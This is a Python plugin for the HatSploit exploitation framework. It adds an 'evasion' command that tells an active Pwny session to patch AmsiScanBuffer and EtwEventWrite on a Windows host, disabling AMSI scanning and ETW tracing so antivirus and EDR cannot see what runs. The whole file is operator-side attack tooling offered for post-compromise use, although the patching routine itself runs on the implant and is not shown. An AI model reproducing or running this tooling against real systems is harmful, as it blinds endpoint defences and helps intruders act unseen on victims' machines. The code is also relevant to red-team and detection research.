"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from hatsploit.lib.core.plugin import Plugin

EVASION_BASE = 28

EVASION_PATCH_AMSI = tlv_custom_tag(API_CALL_STATIC, EVASION_BASE, API_CALL)
EVASION_PATCH_ETW = tlv_custom_tag(API_CALL_STATIC, EVASION_BASE, API_CALL + 1)
EVASION_PATCH_ALL = tlv_custom_tag(API_CALL_STATIC, EVASION_BASE, API_CALL + 2)


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Evasion Plugin",
            'Plugin': "evasion",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': "Patch AMSI/ETW to evade AV and EDR.",
        })

        self.commands = [
            Command({
                'Category': "evasion",
                'Name': "evasion",
                'Description': "Patch AMSI/ETW to evade AV and EDR.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-a', '--amsi'),
                        {
                            'help': "Patch AmsiScanBuffer to disable AMSI.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-e', '--etw'),
                        {
                            'help': "Patch EtwEventWrite to disable ETW tracing.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-A', '--all'),
                        {
                            'help': "Patch both AMSI and ETW.",
                            'action': 'store_true',
                        }
                    ),
                ]
            })
        ]

    def evasion(self, args):
        if args.all:
            self.print_process("Patching AMSI and ETW...")

            result = self.session.send_command(
                tag=EVASION_PATCH_ALL, plugin=self.plugin
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to patch AMSI/ETW!")
                return

            self.print_success("AMSI and ETW patched successfully.")
            return

        if args.amsi:
            self.print_process("Patching AmsiScanBuffer...")

            result = self.session.send_command(
                tag=EVASION_PATCH_AMSI, plugin=self.plugin
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(
                    "Failed to patch AMSI! "
                    "amsi.dll may not be loaded in current process."
                )
                return

            self.print_success("AMSI patched — AmsiScanBuffer neutralized.")

        if args.etw:
            self.print_process("Patching EtwEventWrite...")

            result = self.session.send_command(
                tag=EVASION_PATCH_ETW, plugin=self.plugin
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to patch ETW!")
                return

            self.print_success("ETW patched — EtwEventWrite neutralized.")

        if not args.amsi and not args.etw:
            self.print_usage()

    def load(self):
        pass
